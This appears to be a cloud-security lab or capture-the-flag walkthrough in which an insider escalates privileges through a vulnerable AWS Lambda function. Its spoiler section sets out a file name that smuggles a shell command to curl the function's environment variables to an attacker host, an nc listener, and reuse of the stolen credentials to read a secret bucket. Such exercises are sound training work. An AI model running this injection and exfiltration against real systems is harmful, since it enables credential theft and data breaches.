# Code Injection
Starting as restricted insider Bob, you can list Lambda functions. Upon close(r) inspection you find a vulnerability in the code which you can exploit to elevate your rights.
With the elevated rights you have access to a secret bucket storing confidential information.

## Attack procedure
<details><summary>The steps to take</summary>

1. As user Bob, you can get the list of Lambda functions in the AWS account by running `aws lambda list-functions`.
2. Discover the `fc-vuln` function and get its code by issuing `aws lambda get-function --function-name [function name]`.
3. Once you inspect the code, you discover a remote code execution vulnerability.
4. Discover that Bob actually has write permissions to the Lambda S3 bucket.
5. Upload a `.zip` file which posts the Lambda's environment variables to an evil server.
    <details><summary>Spoiler</summary>
    
    1. Prepare the file `touch 'hello;curl -X POST -d "`env`" [your public reachable IP];.zip'`
    2. run `nc -nlvp` on your evil machine
    3. upload the file to the bucket
    </details>
6. Receive the posted ENV variable on your evil machine and configure the AWS credentials in the AWS CLI.
7. Discover that these credentials have access to the secret bucket.
8. Get secrets.

</details>
